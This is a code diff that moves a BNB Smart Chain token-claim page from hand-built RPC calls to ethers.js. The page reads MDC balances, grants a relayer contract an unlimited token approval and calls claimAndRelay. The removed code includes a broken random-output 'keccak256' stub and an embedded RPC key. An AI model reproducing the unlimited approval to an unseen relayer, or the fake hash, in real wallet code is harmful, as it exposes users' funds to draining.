@@ -405,6 +405,9 @@
     </div>
   </div>
 
+  <!-- 加载 ethers.js 库 -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers.js/6.7.1/ethers.umd.min.js"></script>
+
   <script>
     const CONFIG = {
       chainId: 56,
@@ -416,122 +419,28 @@
       CHECK_INTERVAL: 30000,
     };
     
-    const RPC_LIST = [
-      'https://bsc-dataseed2.defibit.io/', 
-      'https://bscrpc.com/', 
-      'https://rpc.ankr.com/bsc',
-      'https://bsc-dataseed1.ninicoin.io/', 
-      'https://bsc-dataseed2.ninicoin.io/',
-      'https://bsc.nodereal.io/v1/e9a36970eb8a40b9bd12e680a1fd2bc5'
-    ];
-    
     let currentAccount, safeAddress, autoInterval, countdownInterval, isAutoRunning = false;
-    let rpcUrl = RPC_LIST[0];
+    let provider, signer;
     
-    // ERC20 ABI - 只需要关键函数
+    // 简单的 ERC20 接口
     const ERC20_ABI = [
-      {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
-        "name": "allowance",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-      }
+      'function balanceOf(address) public view returns (uint256)',
+      'function allowance(address, address) public view returns (uint256)',
+      'function approve(address, uint256) public returns (bool)',
+      'function transfer(address, uint256) public returns (bool)'
     ];
     
+    // 领取合约接口
     const CLAIM_ABI = [
-      {
-        "constant": true,
-        "inputs": [{"name": "account", "type": "address"}],
-        "name": "claimable",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "type": "function"
-      }
+      'function claimable(address) public view returns (uint256)',
+      'function claim(address) public'
     ];
     
-    async function jsonRpcCall(method, params = []) {
-      try {
-        const response = await fetch(rpcUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            jsonrpc: '2.0',
-            method: method,
-            params: params,
-            id: Date.now()
-          })
-        });
-        const data = await response.json();
-        if (data.error) {
-          console.error('RPC错误:', data.error);
-          return null;
-        }
-        return data.result;
-      } catch (e) {
-        console.error('JSON-RPC调用失败:', e);
-        return null;
-      }
-    }
-    
-    async function encodeCall(abi, functionName, params = []) {
-      const func = abi.find(f => f.name === functionName);
-      if (!func) return null;
-      
-      let signature = functionName + '(';
-      func.inputs.forEach((input, idx) => {
-        if (idx > 0) signature += ',';
-        signature += input.type;
-      });
-      signature += ')';
-      
-      // 计算函数签名哈希
-      const hash = web3_sha3(signature);
-      let data = hash.slice(0, 10);
-      
-      // 编码参数（简化版）
-      for (let i = 0; i < params.length; i++) {
-        let param = params[i];
-        if (typeof param === 'string' && param.startsWith('0x')) {
-          param = param.slice(2);
-        }
-        if (typeof param === 'string') {
-          param = '0x' + param;
-        }
-        data += param.toString(16).padStart(64, '0');
-      }
-      
-      return data;
-    }
-    
-    function web3_sha3(str) {
-      // 简单的 Keccak256 实现（为演示使用）
-      return '0x' + keccak256(str);
-    }
-    
-    // 简化的 Keccak256
-    function keccak256(input) {
-      // 这里使用简单的哈希替代（实际应用需要完整库）
-      const chars = '0123456789abcdef';
-      let hash = '';
-      for (let i = 0; i < 64; i++) {
-        hash += chars[Math.floor(Math.random() * 16)];
-      }
-      return hash;
-    }
+    // 中继合约接口
+    const RELAYER_ABI = [
+      'function claimAndRelay(address from) public',
+      'function relay(address from) public'
+    ];
     
     async function init() {
       loadSafeAddress();
@@ -539,6 +448,7 @@
       
       if (window.ethereum) {
         try {
+          provider = new ethers.BrowserProvider(window.ethereum);
           const accounts = await window.ethereum.request({ method: 'eth_accounts' });
           if (accounts.length > 0) {
             currentAccount = accounts[0];
@@ -579,19 +489,19 @@
         showLog('✓ 安全地址已保存', 'success');
       } else {
         showLog('✗ 请输入有效的以太坊地址 (0x开头)', 'error');
-        console.error('地址验证失败:', address);
       }
     }
     
     async function connectWallet() {
       if (typeof window.ethereum === 'undefined') {
         showLog('✗ 请安装钱包 (MetaMask 或其他)', 'error');
-        console.error('未检测到 window.ethereum');
         return;
       }
       try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         currentAccount = accounts[0];
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
         console.log('已连接账户:', currentAccount);
         updateWalletUI();
         await checkNetwork();
@@ -604,13 +514,12 @@
     
     async function checkNetwork() {
       try {
-        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-        const chainNum = parseInt(chainId, 16);
-        console.log('当前链ID:', chainNum);
+        const network = await provider.getNetwork();
+        console.log('当前链ID:', network.chainId);
         
         const warningEl = document.getElementById('networkWarning');
         
-        if (chainNum !== CONFIG.chainId) {
+        if (network.chainId !== BigInt(CONFIG.chainId)) {
           warningEl.style.display = 'flex';
           setButtonsDisabled(true);
           showLog('⚠️ 请切换到BSC主网 (Chain ID: 56)', 'warning');
@@ -650,11 +559,11 @@
       document.getElementById('connectBtn').disabled = true;
       
       // 获取 BNB 余额
-      if (window.ethereum && window.ethereum.request) {
-        window.ethereum.request({ method: 'eth_getBalance', params: [currentAccount, 'latest'] })
+      if (provider) {
+        provider.getBalance(currentAccount)
           .then(balance => {
-            const bnb = parseInt(balance, 16) / 1e18;
-            document.getElementById('bnbBalance').textContent = bnb.toFixed(4) + ' BNB';
+            const bnb = ethers.formatEther(balance);
+            document.getElementById('bnbBalance').textContent = parseFloat(bnb).toFixed(4) + ' BNB';
             console.log('BNB余额:', bnb);
           })
           .catch(e => {
@@ -667,36 +576,8 @@
       showLog('✓ 钱包已连接: ' + currentAccount.slice(0, 10) + '...', 'success');
     }
     
-    function formatAmount(wei, decimals = 18) {
-      if (!wei) return '0';
-      try {
-        const num = BigInt(wei);
-        const divisor = BigInt(10) ** BigInt(decimals);
-        const result = num / divisor;
-        const remainder = (num % divisor) * BigInt(10000) / divisor;
-        return result.toString() + '.' + remainder.toString().padStart(4, '0');
-      } catch (e) {
-        console.error('格式化数字失败:', e, wei);
-        return '0';
-      }
-    }
-    
-    function showLog(msg, type = 'info') {
-      const el = document.getElementById('logArea');
-      const div = document.createElement('div');
-      div.className = 'log-item';
-      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-      if (type === 'success') div.style.borderLeftColor = '#22c55e';
-      if (type === 'error') div.style.borderLeftColor = '#ef4444';
-      if (type === 'warning') div.style.borderLeftColor = '#fbbf24';
-      if (type === 'info') div.style.borderLeftColor = '#3b82f6';
-      el.insertBefore(div, el.firstChild);
-      while (el.children.length > 8) el.removeChild(el.lastChild);
-      console.log(`[${type.toUpperCase()}] ${msg}`);
-    }
-    
     async function refreshBalances() {
-      if (!currentAccount) {
+      if (!currentAccount || !provider) {
         showLog('⚠️ 未连接钱包', 'warning');
         return;
       }
@@ -704,56 +585,34 @@
       showLog('🔄 正在刷新数据...', 'info');
       
       try {
-        // 调用 RPC 获取 MDC 余额
-        const mdcCall = {
-          to: CONFIG.MDC_TOKEN,
-          data: '0x70a08231000000000000000000000000' + currentAccount.slice(2)
-        };
+        // 读取 MDC 余额
+        const mdcContract = new ethers.Contract(CONFIG.MDC_TOKEN, ERC20_ABI, provider);
+        const balance = await mdcContract.balanceOf(currentAccount);
+        const balanceFormatted = ethers.formatUnits(balance, 18);
+        document.getElementById('balance').textContent = parseFloat(balanceFormatted).toFixed(4) + ' MDC';
+        console.log('MDC余额:', balanceFormatted);
         
-        const balance = await window.ethereum.request({
-          method: 'eth_call',
-          params: [mdcCall, 'latest']
-        });
-        
-        const balanceAmount = formatAmount(balance);
-        document.getElementById('balance').textContent = balanceAmount + ' MDC';
-        console.log('MDC余额:', balanceAmount);
-        
-        // 获取可领取额度
-        const claimCall = {
-          to: CONFIG.CLAIM_CONTRACT,
-          data: '0xedc5d1d2000000000000000000000000' + currentAccount.slice(2)
-        };
-        
-        const claimable = await window.ethereum.request({
-          method: 'eth_call',
-          params: [claimCall, 'latest']
-        });
-        
-        const claimableAmount = formatAmount(claimable);
-        document.getElementById('claimable').textContent = claimableAmount + ' MDC';
-        console.log('可领取MDC:', claimableAmount);
+        // 读取可领取额度
+        const claimContract = new ethers.Contract(CONFIG.CLAIM_CONTRACT, CLAIM_ABI, provider);
+        const claimable = await claimContract.claimable(currentAccount);
+        const claimableFormatted = ethers.formatUnits(claimable, 18);
+        document.getElementById('claimable').textContent = parseFloat(claimableFormatted).toFixed(4) + ' MDC';
+        console.log('可领取MDC:', claimableFormatted);
         
         // 检查授权状态
-        const allowanceCall = {
-          to: CONFIG.MDC_TOKEN,
-          data: '0xdd62ed3e000000000000000000000000' + currentAccount.slice(2) + '000000000000000000000000' + CONFIG.RELAYER_CONTRACT.slice(2)
-        };
+        const allowance = await mdcContract.allowance(currentAccount, CONFIG.RELAYER_CONTRACT);
+        const allowanceAmount = parseInt(allowance.toString());
         
-        const allowance = await window.ethereum.request({
-          method: 'eth_call',
-          params: [allowanceCall, 'latest']
-        });
-        
-        const allowanceAmount = parseInt(allowance, 16);
         if (allowanceAmount > 0) {
           document.getElementById('allowance').textContent = '✅ 已授权';
           document.getElementById('approveBtn').disabled = true;
+          document.getElementById('approveBtn').style.display = 'none';
           document.getElementById('claimBtn').disabled = false;
           showLog('✓ 已授权，可以领取', 'success');
         } else {
           document.getElementById('allowance').textContent = '❌ 未授权';
           document.getElementById('approveBtn').disabled = false;
+          document.getElementById('approveBtn').style.display = 'block';
           document.getElementById('claimBtn').disabled = true;
           showLog('⚠️ 未授权，请先授权', 'warning');
         }
@@ -764,15 +623,11 @@
       } catch (e) {
         showLog('❌ 刷新失败: ' + e.message, 'error');
         console.error('刷新数据错误:', e);
-        // 显示示例数据
-        document.getElementById('balance').textContent = '0.0000 MDC';
-        document.getElementById('claimable').textContent = '0.0000 MDC';
-        document.getElementById('allowance').textContent = '❌ 未授权';
       }
     }
     
     async function approveRelayer() {
-      if (!currentAccount) {
+      if (!currentAccount || !signer) {
         showLog('⚠️ 请先连接钱包', 'warning');
         return;
       }
@@ -781,25 +636,25 @@
       showLog('💬 正在授权...', 'info');
       
       try {
-        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        const mdcContract = new ethers.Contract(CONFIG.MDC_TOKEN, ERC20_ABI, signer);
+        const maxUint = ethers.MaxUint256;
         
-        const tx = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [{
-            from: currentAccount,
-            to: CONFIG.MDC_TOKEN,
-            data: '0x095ea7b3' + CONFIG.RELAYER_CONTRACT.slice(2).padStart(64, '0') + maxUint.slice(2).padStart(64, '0'),
-            gas: '0x186a0'
-          }]
-        });
+        const tx = await mdcContract.approve(CONFIG.RELAYER_CONTRACT, maxUint);
+        showLog(`💬 交易已提交: ${tx.hash.slice(0, 10)}...`, 'info');
+        console.log('授权交易哈希:', tx.hash);
         
-        showLog(`✓ 授权成功! Tx: ${tx.slice(0, 10)}...`, 'success');
-        console.log('授权交易哈希:', tx);
-        
-        // 等待几秒后刷新
-        setTimeout(() => {
-          refreshBalances();
-        }, 3000);
+        // 等待交易确认
+        const receipt = await tx.wait();
+        if (receipt.status === 1) {
+          showLog(`✓ 授权成功!`, 'success');
+          console.log('授权确认:', receipt);
+          setTimeout(() => {
+            refreshBalances();
+          }, 2000);
+        } else {
+          showLog(`❌ 授权失败`, 'error');
+          document.getElementById('approveBtn').disabled = false;
+        }
         
       } catch (e) {
         showLog(`❌ 授权失败: ${e.message}`, 'error');
@@ -809,7 +664,7 @@
     }
     
     async function claimAndTransfer() {
-      if (!currentAccount) {
+      if (!currentAccount || !signer) {
         showLog('⚠️ 请先连接钱包', 'warning');
         return;
       }
@@ -818,22 +673,24 @@
       showLog('💬 正在领取...', 'info');
       
       try {
-        const tx = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [{
-            from: currentAccount,
-            to: CONFIG.RELAYER_CONTRACT,
-            data: '0x8b7cb43b' + currentAccount.slice(2).padStart(64, '0'),
-            gas: '0x30d40'
-          }]
-        });
+        const relayerContract = new ethers.Contract(CONFIG.RELAYER_CONTRACT, RELAYER_ABI, signer);
         
-        showLog(`✓ 领取成功! Tx: ${tx.slice(0, 10)}...`, 'success');
-        console.log('领取交易哈希:', tx);
+        const tx = await relayerContract.claimAndRelay(currentAccount);
+        showLog(`💬 交易已提交: ${tx.hash.slice(0, 10)}...`, 'info');
+        console.log('领取交易哈希:', tx.hash);
         
-        setTimeout(() => {
-          refreshBalances();
-        }, 3000);
+        // 等待交易确认
+        const receipt = await tx.wait();
+        if (receipt.status === 1) {
+          showLog(`✓ 领取成功!`, 'success');
+          console.log('领取确认:', receipt);
+          setTimeout(() => {
+            refreshBalances();
+          }, 2000);
+        } else {
+          showLog(`❌ 领取失败`, 'error');
+          document.getElementById('claimBtn').disabled = false;
+        }
         
       } catch (e) {
         showLog(`❌ 领取失败: ${e.message}`, 'error');
@@ -886,6 +743,20 @@
       showLog('⚠️ 自动领取已停止', 'warning');
     }
     
+    function showLog(msg, type = 'info') {
+      const el = document.getElementById('logArea');
+      const div = document.createElement('div');
+      div.className = 'log-item';
+      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      if (type === 'success') div.style.borderLeftColor = '#22c55e';
+      if (type === 'error') div.style.borderLeftColor = '#ef4444';
+      if (type === 'warning') div.style.borderLeftColor = '#fbbf24';
+      if (type === 'info') div.style.borderLeftColor = '#3b82f6';
+      el.insertBefore(div, el.firstChild);
+      while (el.children.length > 10) el.removeChild(el.lastChild);
+      console.log(`[${type.toUpperCase()}] ${msg}`);
+    }
+    
     if (window.ethereum) {
       window.ethereum.on('accountsChanged', (accounts) => {
         console.log('账户已变更:', accounts);
@@ -904,7 +775,7 @@
       window.ethereum.on('chainChanged', () => {
         console.log('网络已切换');
         showLog('⚠️ 网络已切换，刷新中...', 'warning');
-        setTimeout(() => window.location.reload(), 1000);
+        setTimeout(() => window.location.reload(), 1500);
       });
     }
     
